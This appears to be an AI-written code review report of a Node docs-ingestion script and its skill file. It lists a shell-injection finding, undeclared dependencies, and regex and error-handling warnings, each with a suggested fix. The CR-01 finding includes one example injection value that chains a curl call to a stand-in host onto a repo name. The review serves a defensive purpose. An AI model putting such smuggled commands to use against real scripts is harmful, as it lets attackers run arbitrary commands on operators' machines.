---
phase: 06-doc-pipeline
reviewed: 2026-08-24T00:00:00Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - _scripts/ingest-artifact.mjs
  - .claude/skills/wm-gen-docs.md
  - package.json
findings:
  critical: 2
  warning: 6
  info: 3
  total: 11
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-08-24
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

The phase delivers `ingest-artifact.mjs` extended with a `--mode docs` branch and the `wm-gen-docs.md` skill. The core mechanics are sound — HAST-based tree walking, zip extraction with a zip-slip check, GFM export via Turndown, and a `gh api PUT` commit path. However, two blockers exist: a real command-injection vector through the unvalidated `wiring.prod_repo` field, and a pair of undeclared package dependencies that are silently borrowed from `astro`'s transitive closure and will break when `astro` bumps its own deps. Six additional warnings cover CSS mutation scope, error swallowing, regex replacement correctness, and non-interactive terminal handling.

---

## Critical Issues

### CR-01: Shell injection via unvalidated `wiring.prod_repo`

**File:** `_scripts/ingest-artifact.mjs:293`
**Issue:** `ghApiPutFile` interpolates `owner` and `repo` — split directly from `repoFullName` — into a bare `execSync` shell string. When `runDocsMode` resolves `prodRepo` at line 337 as `targetRepoArg || wiring?.prod_repo`, the `targetRepoArg` path is validated by the regex on line 323, but the `wiring?.prod_repo` path is **not validated at all**. A `wiring.json` entry like `"prod_repo": "pbau3r-sfdy/foo; curl https://evil.example"` would execute arbitrary shell commands on the operator's machine.

```js
// _scripts/ingest-artifact.mjs line 337 — add validation before using prod_repo
const rawProdRepo = targetRepoArg || wiring?.prod_repo;
if (rawProdRepo && !/^[a-z0-9-]+\/[a-z0-9._-]+$/i.test(rawProdRepo)) {
  fail(`prod_repo value "${rawProdRepo}" contains invalid characters — check wiring.json`);
}
const prodRepo = rawProdRepo;
```

Alternatively, replace the `gh api ${apiPath}` interpolation pattern with the `--repo` flag and positional arguments so the shell never sees user-controlled data:

```js
// ghApiPutFile: avoid string interpolation entirely for the path
execSync(`gh api /repos/${owner}/${repo}/contents/${repoPath} --jq .sha`, ...)
// → no change in behaviour, but still relies on owner/repo being safe
// Safest fix is to validate before calling ghApiPutFile
```

---

### CR-02: `hast-util-from-html` and `hast-util-to-html` are undeclared dependencies

**File:** `_scripts/ingest-artifact.mjs:47-48` / `package.json`
**Issue:** Both packages are imported at the top of the script but appear nowhere in `package.json` `dependencies` or `devDependencies`. They currently resolve because they are hoisted transitive dependencies of `astro`. This is fragile: any `astro` minor or patch release that changes its own dependency tree (or switches to a workspace-private installation) will silently break the script with a `Cannot find package` error.

```json
// package.json — add explicit declarations
"dependencies": {
  "adm-zip": "^0.6.0",
  "astro": "^5.0.0",
  "hast-util-from-html": "^2.0.0",
  "hast-util-to-html": "^9.0.0",
  "turndown": "^7.2.4"
}
```

Run `npm install` after adding to pin the actual resolved versions.

---

## Warnings

### WR-01: Dollar-sign in doc-token values corrupts the CSS regex replacement

**File:** `_scripts/ingest-artifact.mjs:268`
**Issue:** `css.replace(varRe, `$1${newVal}`)` passes `newVal` directly as a JavaScript replacement string. In `String.prototype.replace`, the replacement string interprets `$1`, `$&`, `$'`, etc. as special patterns. A `doc_tokens` value such as `"$100"`, `"calc($1 + 2px)"`, or any value containing `$n` would silently produce incorrect CSS output — the regex backreference would be substituted instead of the literal dollar sign.

```js
// Escape $ signs in the replacement value before use
const safeNewVal = newVal.replace(/\$/g, '$$$$');
css = css.replace(varRe, `$1${safeNewVal}`);
```

---

### WR-02: CSS variable replacement is not scoped to `:root` — overwrites all occurrences

**File:** `_scripts/ingest-artifact.mjs:267-268`
**Issue:** The global-flag regex `varRe` replaces the target property in **every occurrence** within the entire `<style>` block text, not just the `:root {}` declaration. If the artifact contains a component-level override of the same variable (e.g., `.dark-theme { --accent: #000; }`) that override is silently clobbered, even though the intent of `injectDocTokens` is only to modify the `:root` declaration.

```js
// Scope the replacement to the :root block by extracting and replacing only that block
const rootBlockRe = /(:root\s*\{)([^}]*)(})/g;
css = css.replace(rootBlockRe, (_, open, body, close) => {
  const escapedProp = prop.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const propRe = new RegExp(`(${escapedProp}\\s*:\\s*)[^;\\n]+`);
  const updated = propRe.test(body)
    ? body.replace(propRe, `$1${newVal}`)
    : body + `\n  ${prop}: ${newVal};`;
  return open + updated + close;
});
```

---

### WR-03: Empty `catch` in SHA fetch silently swallows authentication and network failures

**File:** `_scripts/ingest-artifact.mjs:295`
**Issue:** The `catch` block that wraps the SHA lookup logs "creating new file" for **all** errors — including `gh` not authenticated, network timeouts, malformed repo paths, and rate-limit responses. When this happens, `sha` stays `null` and the subsequent PUT is sent without a SHA. The PUT then returns `422 Unprocessable Entity` (for an existing file), which surfaces as a cryptic error with no indication that the root cause was an auth failure on the GET.

```js
try {
  const result = execSync(`gh api ${apiPath} --jq .sha`, { encoding: 'utf-8' }).trim();
  if (result && result !== 'null') { sha = result; ... }
} catch (err) {
  // Only suppress 404 (file not found); re-throw anything else
  const msg = err.message || '';
  if (!msg.includes('404') && !msg.includes('Not Found')) throw err;
  info(`creating new ${repoPath}`);
}
```

---

### WR-04: Uncaught crash when `/dev/tty` is unavailable in non-interactive mode

**File:** `_scripts/ingest-artifact.mjs:384`
**Issue:** When a zip contains multiple HTML files and `--force` is not set, the script runs `execSync('read reply < /dev/tty && echo $reply', ...)` to collect a selection from the terminal. In containerised, piped, or CI environments where `/dev/tty` does not exist, `execSync` throws an uncaught exception with a Node.js stack trace. There is no try/catch guard here, so the process exits with an unhelpful error.

```js
// Replace execSync shell read with readline on stdout/stderr
import { createInterface } from 'readline';
// ... inside the else-if block:
log('Multiple HTML files found in zip. Select one:');
htmlFiles.forEach((f, i) => log(`  ${i + 1}. ${basename(f)}`));
try {
  const reply = execSync('read reply < /dev/tty && echo $reply', {
    encoding: 'utf-8', stdio: ['pipe', 'pipe', 'inherit'],
  }).trim();
  // ... rest of handler
} catch {
  fail('Interactive file selection requires a TTY — re-run with --force to auto-select the first HTML file');
}
```

---

### WR-05: `ghApiPutFile` failures surface as raw Node.js stack traces in docs mode

**File:** `_scripts/ingest-artifact.mjs:457-465`
**Issue:** `ghApiPutFile` is called directly with no wrapping try/catch in `runDocsMode`. If `gh api PUT` fails (network error, authentication expired, `422` from a stale SHA), Node.js prints a raw `SpawnSyncReturnsObject` exception. The `wm-gen-docs.md` skill spec (step 6) instructs: "If this command fails… surface the exact error and stop. Do NOT retry silently." A stack trace is not a clean error surface — it buries the `gh` stderr output that would actually tell the operator what went wrong.

```js
// Wrap in a try/catch with a targeted error message
try {
  ghApiPutFile(prodRepo, `docs/${outputName}.html`, htmlBytes, `docs: add ${outputName}.html [wm-gen-docs]`);
} catch (err) {
  fail(`gh api PUT failed for docs/${outputName}.html → ${prodRepo}\n  ${err.message}`);
}
```

---

### WR-06: Skill mandates `pbau3r-sfdy` org but script only warns — behaviour diverges from documentation

**File:** `.claude/skills/wm-gen-docs.md:16` / `_scripts/ingest-artifact.mjs:326-328`
**Issue:** The skill states `--target-repo` "must be in the `pbau3r-sfdy/*` namespace" and the Notes section repeats "must be in `pbau3r-sfdy/`". However, the script only emits a `warn()` and continues. An operator relying on the skill's wording will be surprised that a cross-org commit proceeds after the warning. Either the script should `fail()` on out-of-org targets (matching the documentation), or the documentation should be changed to reflect the warn-and-continue behaviour.

```js
// ingest-artifact.mjs line 326 — change warn to fail to match skill spec
if (targetRepoArg && !targetRepoArg.startsWith('pbau3r-sfdy/')) {
  fail(`--target-repo "${targetRepoArg}" is outside the pbau3r-sfdy org — operation aborted`);
}
```

---

## Info

### IN-01: `--target-repo` validation regex rejects valid GitHub repo names

**File:** `_scripts/ingest-artifact.mjs:323`
**Issue:** The regex `/^[a-z0-9-]+\/[a-z0-9-]+$/` rejects repo names that contain dots (`my.repo`), underscores (`my_repo`), or uppercase letters — all of which are valid on GitHub. This causes a hard failure if a production repo slug ever contains these characters.

```js
// Broaden the regex to match GitHub's actual naming rules
if (targetRepoArg && !/^[a-zA-Z0-9._-]+\/[a-zA-Z0-9._-]+$/.test(targetRepoArg)) {
  fail('--target-repo must match org/repo format (letters, digits, hyphens, underscores, dots)');
}
```

---

### IN-02: `writeSectionMode` reads the artifact HTML twice

**File:** `_scripts/ingest-artifact.mjs:689`
**Issue:** In section mode the artifact HTML is read from disk at line 792 (global scope, before the section-mode dispatch), and then read a second time inside `writeSectionMode` at line 689. The second read is redundant. The already-parsed `htmlString` (and the `tree`) from the global scope could be passed in as parameters, or `writeSectionMode` could accept the pre-read string directly.

```js
// Pass htmlString as a parameter to avoid the second readFileSync call
function writeSectionMode(slug, sectionName, sections, cssText, htmlString, siteDir, date) { ... }
// Call site (line 813):
writeSectionMode(slug, sectionArg, sections, cssText, htmlString, siteDir, date);
```

---

### IN-03: Step numbering in `writeSectionMode` skips step 12

**File:** `_scripts/ingest-artifact.mjs:756`
**Issue:** The inline step comments inside `writeSectionMode` jump from `// 11.` (line 748) directly to `// 13.` (line 756) with no step 12. This is a dead comment artefact from a refactor. It does not affect behaviour but makes the function harder to follow during maintenance.

Remove or renumber so steps are sequential.

---

_Reviewed: 2026-08-24_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
